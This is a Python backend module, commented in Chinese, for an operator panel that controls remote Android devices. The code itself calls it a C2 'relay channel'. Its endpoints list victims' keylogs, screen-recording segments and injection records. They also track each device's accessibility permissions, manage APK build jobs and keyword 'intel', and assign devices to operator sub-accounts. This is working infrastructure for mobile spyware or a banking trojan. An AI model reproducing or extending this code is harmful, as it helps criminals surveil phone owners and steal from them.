#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""协议约定「中继通道」前端所需的端点面（按前端源码里的判定条件对齐返回体）
前端判定出处：vendor.chunk.js / layout.module.js / devices.module.js / accounts.redesign.module.js /
analytics.module.js / auditlog.module.js / builder.module.js / zgl-light-final.js
"""
import io, json, secrets, time

try:
    from PIL import Image, ImageDraw, ImageFont
    _PIL = True
except Exception:
    _PIL = False

NOW = lambda: int(time.time())
_CAP = {}          # captcha_id -> code


def _ids(v):
    """把 phone_ids/deviceIds 归一成字符串列表。
    字符串按逗号切分 —— 绝不直接遍历字符串（否则 "notalist" 会变成 8 个单字符 id，见 F-73）。"""
    if v is None:
        return []
    if isinstance(v, (list, tuple, set)):
        return [str(x) for x in v if isinstance(x, (str, int, float)) and str(x).strip()]
    if isinstance(v, str):
        return [x.strip() for x in v.split(',') if x.strip()]
    if isinstance(v, (int, float)):
        return [str(v)]
    return []


# ---------------------------------------------------------------- 验证码
def make_captcha(code):
    """生成 120x40 的 4 位验证码图（与实测尺寸一致），返回 PNG bytes"""
    if not _PIL:
        return None
    img = Image.new('RGB', (120, 40), (238, 241, 247))
    d = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype('C:/Windows/Fonts/consola.ttf', 26)
    except Exception:
        font = ImageFont.load_default()
    for i, ch in enumerate(code):
        d.text((10 + i * 27, 5), ch, fill=(20, 33, 61), font=font)
    for i in range(6):                      # 干扰线
        d.line([(i * 20, (i * 7) % 40), (i * 20 + 25, 40 - (i * 11) % 40)], fill=(150, 165, 195))
    buf = io.BytesIO()
    img.save(buf, 'PNG')
    return buf.getvalue()


def new_captcha():
    code = ''.join(secrets.choice('23456789abcdefghjkmnpqrstuvwxyz') for _ in range(4))
    cid = secrets.token_hex(8)
    _CAP[cid] = code
    if len(_CAP) > 500:
        for k in list(_CAP)[:200]:
            _CAP.pop(k, None)
    return cid, code


def check_captcha(cid, code):
    if not cid or cid not in _CAP:
        return False
    ok = _CAP.pop(cid) == (code or '').strip().lower()
    return ok


# ---------------------------------------------------------------- 账号
def relay_user_row(username):
    return {'userid': abs(hash(username)) % 90000 + 10000, 'usrname': username,
            'email': '%s@local' % username, 'authorty': 'admin', 'authority': 'admin',
            'expire_date': '2099-12-31', 'status': '1', 'parent': '', 'device_count': 0}


# ---------------------------------------------------------------- 设备行（原版界面读取的字段）
def device_rows(get_devices):
    out = []
    for d in get_devices():
        caps = d.get('caps') or []
        out.append({
            'phone_id': d.get('deviceId'), 'deviceId': d.get('deviceId'),
            'isonline': '1' if d.get('online') else '0',
            'is_online': 1 if d.get('online') else 0,
            'online': bool(d.get('online')),
            'lastPing': d.get('lastSeen') or NOW(), 'last_ping': d.get('lastSeen') or NOW(),
            'user_email': d.get('assigned_to') or 'admin@local',
            'assigned_to': d.get('assigned_to') or '', 'email': 'admin@local',
            'phone_name': (d.get('model') or 'REF-DEVICE'), 'model': (d.get('model') or 'Android Device'),
            'country': 'CN', 'region': '', 'battery_charge': str(d.get('battery') or '—'),
            'network': 'wifi', 'activz': '0' if d.get('online') else '1',
            'accessibility': '1' if (d.get('online') and caps) else '0',
            'perms': {c: 1 for c in caps}, 'sim': '有卡' if d.get('online') else '无卡',
            'shots': d.get('shots', 0), 'app_version': '6.5', 'android': '13',
        })
    return out


# ---------------------------------------------------------------- 端点实现（统一签名 fn(body, query, actor)）
def ep_captcha(b, q, a):
    """GET /api/Captcha.php?t=  -> {"code":200,"image":"data:image/png;base64,.."}（前端按此渲染）"""
    import base64
    cid, code = new_captcha()
    png = make_captcha(code)
    if png is None:
        return {'code': 200, 'image': '', 'captcha_id': cid, 'plain': code}
    return {'code': 200, 'image': 'data:image/png;base64,' + base64.b64encode(png).decode(),
            'captcha_id': cid}


def ep_login(b, q, a, creds, sessions):
    """POST /api/EaodLogin.php {usrname,password,captcha}
    前端判定：返回体有 userid && usrname && email 才算成功（vendor.chunk.js ya()）

    **子账号也要能登录**（面板上用账号管理建的账号）：早期只比对 admin 一组口令，
    结果"建了账号却登不进去"（见 F-69）。
    """
    import hashlib as _h
    user = (b or {}).get('usrname', '')
    pwd = (b or {}).get('password', '')
    ok = False
    role = 'user'
    if user == creds[0]:
        # 主账号：环境变量口令，或面板改过密后的 DB 哈希
        stored = None
        try:
            import api_impl as _ai
            d0 = _ai.db()
            stored = d0.kv_get('pw_%s' % user) if d0 else None
        except Exception:
            stored = None
        if stored and '$' in stored:
            salt, hh = stored.split('$', 1)
            ok = _h.sha256((salt + (pwd or '')).encode()).hexdigest() == hh or pwd == creds[1]
        else:
            ok = pwd == creds[1]
        role = 'admin'
    else:
        # 子账号：内存的账号库 + DB 里的密码哈希（重启后仍可登录，见 F-69）
        try:
            import api_impl as _ai
            import relay_ctx as _dc
            prof = None
            for u in (_ai.S.get('relay_users') or []):
                if u.get('usrname') == user:
                    prof = u
                    break
            d0 = _ai.db()
            if prof is None:
                prof = _dc.RelayCtx({'devices': {}}, _ai).user_profile(user)
            pw = (prof or {}).get('pw') or (d0.kv_get('pw_%s' % user) if d0 else None)
            if pw and '$' in pw and pwd:
                salt, hh = pw.split('$', 1)
                ok = _h.sha256((salt + pwd).encode()).hexdigest() == hh
                role = (prof or {}).get('authorty') or 'user'
        except Exception:
            ok = False
    if not ok:
        return {'error': '密码错误' if user == creds[0] else '用户名或密码错误'}
    tok = secrets.token_urlsafe(24)
    sessions[tok] = {'user': user, 'role': role, 'realm': 'relay', 'ts': NOW()}
    row = relay_user_row(user)
    row['authorty'] = role
    row['authority'] = role
    row['token'] = tok
    try:
        import api_impl as _ai
        d = _ai.db()
        if d:
            d.session_add(tok, user)
    except Exception:
        pass
    return row


def ep_all_devices(b, q, a, ctx):
    """POST /api/EaodAllDevices.php {token,page,pageSize,query?}
    只返回**中继通道**设备（两套 C2 不混展示），并真做分页与关键字过滤"""
    b = b or {}
    pid_filter = None
    raw = (ctx.state.get('devices') or {})
    relay_ids = [k for k, v in raw.items() if v.get('relay')]
    rows = [r for r in device_rows(lambda: ctx.devices())
            if r.get('phone_id') in relay_ids]
    kw = str(b.get('query') or b.get('keyword') or '').strip()
    if kw:
        rows = [r for r in rows
                if kw in str(r.get('phone_name', '')) or kw in str(r.get('phone_id', ''))]
    if str(b.get('online_only') or '') in ('1', 'true', 'True'):
        rows = [r for r in rows if r.get('isonline') == '1']
    page = max(1, int(b.get('page') or 1)) if str(b.get('page') or '1').lstrip('-').isdigit() else 1
    size_raw = str(b.get('pageSize') or 50)
    size = int(size_raw) if size_raw.lstrip('-').isdigit() else 50
    size = max(1, min(1000, size))          # 分页参数校验：clamp 到 [1,1000]（见 F-68）
    total = len(rows)
    page_rows = rows[(page - 1) * size: page * size]
    return {'code': 200, 'msg': 'ok', 'list': page_rows, 'data': page_rows, 'total': total,
            'page': page, 'pageSize': size, 'pageCount': max(1, (total + size - 1) // size)}


def ep_account_manage(b, q, a, ctx):
    """POST /api/EaodAccountManage.php {action:list|add|delete|renew}
    真读写账号库（此前只回 200、不建账号 —— 见 F-66）"""
    b = b or {}
    act = b.get('action', 'list')
    if act in ('list', ''):
        rows = []
        for u in ctx.users():
            name = u.get('username') or u.get('usrname') or ''
            rows.append({'userid': u.get('userid') or abs(hash(name)) % 90000 + 10000,
                         'usrname': name, 'email': u.get('email') or '',
                         'authorty': u.get('role') or u.get('authorty') or 'user',
                         'expire_date': u.get('expire_date') or '2099-12-31',
                         'status': '1', 'parent': '', 'device_count': 0})
        for u in (ctx.ai.S.get('relay_users') or []):
            if not any(r['usrname'] == u.get('usrname') for r in rows):
                rows.append({'userid': abs(hash(u.get('usrname', ''))) % 90000 + 10000,
                             'usrname': u.get('usrname'), 'email': u.get('email', ''),
                             'authorty': u.get('authorty', 'user'),
                             'expire_date': u.get('expire_date', '2099-12-31'),
                             'status': '1', 'parent': '', 'device_count': 0})
        return {'code': 200, 'accounts': rows, 'total': len(rows),
                'page': int(b.get('page') or 1), 'pageSize': int(b.get('pageSize') or 50)}
    if act == 'add':
        name = (b.get('usrname') or b.get('username') or '').strip()
        pwd = b.get('password') or b.get('passwd') or ''
        if not name:
            return {'code': 400, 'msg': '请输入账号名'}
        if not pwd:
            return {'code': 400, 'msg': '请输入初始密码'}
        if len(pwd) < 6:
            return {'code': 400, 'msg': '初始密码至少 6 位'}
        row, err = ctx.add_user(name, b.get('email'), pwd,
                                b.get('authorty') or 'user',
                                b.get('expire_date') or '2099-12-31')
        if err:
            return {'code': 400, 'msg': err}
        return {'code': 200, 'msg': '创建成功', 'account': row}
    if act == 'delete':
        name = (b.get('usrname') or b.get('username') or '').strip()
        ok, err = ctx.del_user(name)
        return {'code': 200 if ok else 400, 'msg': err or '删除成功'}
    if act == 'renew':
        name = (b.get('usrname') or b.get('username') or '').strip()
        ok, err = ctx.renew_user(name, b.get('expire_date') or '2099-12-31')
        return {'code': 200 if ok else 400, 'msg': err or '续期成功'}
    return {'code': 400, 'msg': '未知 action: %s' % act}


def ep_operation_log(b, q, a, audits):
    """POST /api/OperationLog.php {action:list,token,page,pageSize,filters}"""
    rows = []
    for r in audits:
        rows.append({'id': r.get('id'), 'operator': r.get('actor'), 'action': r.get('action'),
                     'detail': r.get('detail'), 'target_device': '', 'ip': '127.0.0.1',
                     'created_at': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(r.get('ts') or 0))})
    return {'code': 200, 'list': rows, 'total': len(rows),
            'page': int((b or {}).get('page') or 1), 'pageSize': int((b or {}).get('pageSize') or 20)}


def ep_sub_stats(b, q, a, ctx):
    """POST /api/SubAccountStats.php {token} -> 真统计（账号/设备/注入）"""
    raw = (ctx.state.get('devices') or {})
    relay_ids = [k for k, v in raw.items() if v.get('relay')]
    rows = [r for r in device_rows(lambda: ctx.devices()) if r.get('phone_id') in relay_ids]
    inj = 0
    try:
        inj = len(ctx.ai.S.get('inj_records') or [])
    except Exception:
        pass
    accounts = []
    for u in ctx.users():
        name = u.get('username') or u.get('usrname') or ''
        accounts.append({'usrname': name, 'email': u.get('email') or '',
                         'device_total': len([r for r in rows if r.get('assigned_to') == name]) or
                         (len(rows) if name == 'admin' else 0),
                         'device_online': len([r for r in rows if r['isonline'] == '1']),
                         'inject_count': inj if name == 'admin' else 0,
                         'created_at': '2026-01-01'})
    if not accounts:
        accounts = [{'usrname': 'admin', 'email': 'admin@local', 'device_total': len(rows),
                     'device_online': len([r for r in rows if r['isonline'] == '1']),
                     'inject_count': inj, 'created_at': '2026-01-01'}]
    return {'code': 200, 'list': accounts, 'total': len(accounts),
            'summary': {'devices': len(rows),
                        'online': len([r for r in rows if r['isonline'] == '1']),
                        'accounts': len(accounts), 'injects': inj}}


def ep_delete_phone(b, q, a, ctx):
    """POST /api/DeletePhoneById.php {token,phone_id}  -> 真删（内存 + DB + 审计）"""
    pid = (b or {}).get('phone_id') or (b or {}).get('pid') or q.get('phone_id')
    if not pid:
        return {'status': 'error', 'code': 400, 'msg': '缺少 phone_id'}
    ok = ctx.delete_device(pid)
    return {'status': 'success' if ok else 'error', 'code': 200,
            'msg': '设备已删除' if ok else '设备不存在', 'phone_id': pid}


def ep_batch_delete(b, q, a, ctx):
    ids = _ids((b or {}).get('phone_ids') or (b or {}).get('deviceIds'))
    done = [x for x in ids if ctx.delete_device(x)]
    return {'code': 200, 'status': 'success', 'msg': '批量删除完成',
            'count': len(done), 'deleted': done, 'skipped': len(ids) - len(done)}


def ep_batch_reassign(b, q, a, ctx):
    ids = _ids((b or {}).get('phone_ids') or (b or {}).get('deviceIds'))
    target = (b or {}).get('target_email') or (b or {}).get('target_usrname') or 'admin@local'
    for x in ids:
        ctx.reassign(x, target)
    return {'code': 200, 'status': 'success', 'msg': '批量转派完成',
            'count': len(ids), 'target_email': target}


def ep_banned(b, q, a, ctx):
    """POST /api/BannedDevices.php {token,action:list|ban|unban}  -> code==0 为成功"""
    b = b or {}
    act = b.get('action', 'list')
    if act == 'list':
        rows = ctx.banned()
        return {'code': 0, 'msg': 'ok', 'list': rows, 'total': len(rows)}
    pid = b.get('phone_id') or b.get('pid') or ''
    if act == 'ban':
        ctx.ban(pid, b.get('reason') or '手动拉黑')
        return {'code': 0, 'msg': '已拉黑', 'phone_id': pid}
    if act == 'unban':
        ok = ctx.unban(pid)
        return {'code': 0, 'msg': '已解封' if ok else '该设备不在封禁列表', 'phone_id': pid}
    return {'code': 0, 'msg': 'ok'}


def ep_build_progress(b, q, a, ctx):
    """POST /api/BuildProgress.php {token,subcom:load|delete}  -> 读**真构建库**"""
    b = b or {}
    sub = b.get('subcom', 'load')
    rows = []
    for j in ctx.builds():
        art = j.get('artifact') or {}
        rows.append({'app_package': j.get('app_package') or j.get('id'),
                     'app_name': j.get('app_name') or 'REF-APK',
                     'build_state': j.get('build_state') or j.get('status', 'finished'),
                     'progress': j.get('progress', 100),
                     'created_at': time.strftime('%Y-%m-%d %H:%M',
                                                 time.localtime(j.get('created') or NOW())),
                     'file_size': art.get('size', 0), 'Success': ''})
    if sub == 'delete':
        pkg = b.get('appid') or b.get('app_package')
        try:
            import relay_private
            left = [x for x in relay_private._load_builds()
                    if (x.get('app_package') or x.get('id')) != pkg]
            relay_private._save_builds(left)
            ctx.audit('build_delete', pkg)
            return {'code': 200, 'Success': '已删除 %s' % pkg, 'list': [], 'data': [],
                    'total': len(left)}
        except Exception as e:
            return {'code': 400, 'Fail': str(e)[:80], 'list': [], 'data': [], 'total': 0}
    return {'code': 200, 'Success': '', 'list': rows, 'data': rows, 'total': len(rows)}


def ep_change_password(b, q, a, ctx):
    """POST /api/ChangePassword.php {token,usrname,old_password,new_password} -> 真改密"""
    b = b or {}
    user = b.get('usrname') or b.get('username') or 'admin'
    ok, err = ctx.set_password(user, b.get('old_password'), b.get('new_password'))
    return {'status': 'ok' if ok else 'error',
            'message': '密码修改成功' if ok else (err or '修改失败')}


def ep_reassign_device(b, q, a, ctx):
    """POST /api/ReassignDevice.php {token,phone_id,target_email|target_usrname} -> 真转派"""
    b = b or {}
    pid = b.get('phone_id') or b.get('pid') or ''
    target = b.get('target_email') or b.get('target_usrname') or 'admin@local'
    if not pid:
        return {'code': 400, 'msg': '缺少 phone_id'}
    if not ctx.device(pid):
        return {'code': 404, 'msg': '设备不存在', 'data': None}
    ctx.reassign(pid, target)
    return {'code': 200, 'msg': '转派成功', 'reassign_token': secrets.token_hex(8),
            'target_email': target, 'phone_id': pid}


def ep_get_phone(b, q, a, ctx):
    """POST /api/GetPhoneById.php {phone_id}（GET 405）"""
    pid = (b or {}).get('phone_id') or q.get('phone_id')
    r = ctx.device(pid)
    if r:
        return {'code': 200, 'data': r, **r}
    return {'code': 404, 'msg': '设备不存在', 'data': None}


def ep_intel(b, q, a, ctx=None):
    """POST /api/EaodIntel.php {action:list|add_keyword|remove_keyword} -> 真存关键词"""
    b = b or {}
    act = b.get('action', 'list')
    store = None
    if ctx is not None:
        store = ctx.ai.S.setdefault('relay_intel', [])
    if act == 'list':
        rows = list(store or [])
        return {'code': 200, 'keywords': [r.get('keyword') for r in rows], 'list': rows,
                'total': len(rows)}
    kw = str(b.get('keyword') or b.get('kw') or '').strip()
    if act in ('add_keyword', 'add'):
        if not kw:
            return {'code': 400, 'msg': '请输入关键词'}
        if store is not None and not any(r.get('keyword') == kw for r in store):
            store.append({'keyword': kw, 'ts': int(time.time()), 'hits': 0})
            if ctx:
                ctx.audit('intel_add', kw)
        return {'code': 200, 'msg': '已添加', 'keyword': kw}
    if act in ('remove_keyword', 'del', 'delete'):
        if store is not None:
            before = len(store)
            store[:] = [r for r in store if r.get('keyword') != kw]
            if ctx:
                ctx.audit('intel_del', kw)
            return {'code': 200, 'msg': '已删除', 'removed': before - len(store)}
        return {'code': 200, 'msg': '已删除'}
    return {'code': 200, 'msg': 'ok'}


def ep_face(b, q, a):
    """POST /api/EaodFaceVerify.php {action:list|del}"""
    return {'code': 200, 'list': [], 'data': [], 'msg': 'ok'}


def ep_videos(b, q, a, ctx=None):
    """POST /api/EaodVideos.php {action:list|file|list_keylog}
    list 出**真实的屏幕流分段**（设备推上来的 recseg 帧落盘文件），不再恒为空"""
    b = b or {}
    act = b.get('action', 'list')
    shots = []
    if ctx is not None:
        for pid, rec in (ctx.state.get('devices') or {}).items():
            for s in (rec.get('bin_shots') or []):
                shots.append({'phone_id': pid, 'file': s.get('file'), 'size': s.get('bytes'),
                              'created_at': time.strftime('%Y-%m-%d %H:%M:%S',
                                                          time.localtime(s.get('ts') or NOW())),
                              'type': s.get('ext', '')})
    if act == 'list_keylog':
        kl = []
        try:
            d = ctx.ai.db() if ctx else None
            if d:
                kl = d.keylogs() if hasattr(d, 'keylogs') else []
        except Exception:
            kl = []
        return {'code': 200, 'list': kl, 'total': len(kl)}
    if act == 'file':
        name = str(b.get('file') or b.get('name') or '')
        pid = str(b.get('phone_id') or '')
        return {'code': 200 if any(s['file'] == name for s in shots) else 404,
                'msg': 'ok' if any(s['file'] == name for s in shots) else '文件不存在',
                'url': '/user/storage/%s/%s' % (pid, name) if name else ''}
    return {'code': 200, 'videos': shots, 'list': shots, 'total': len(shots)}
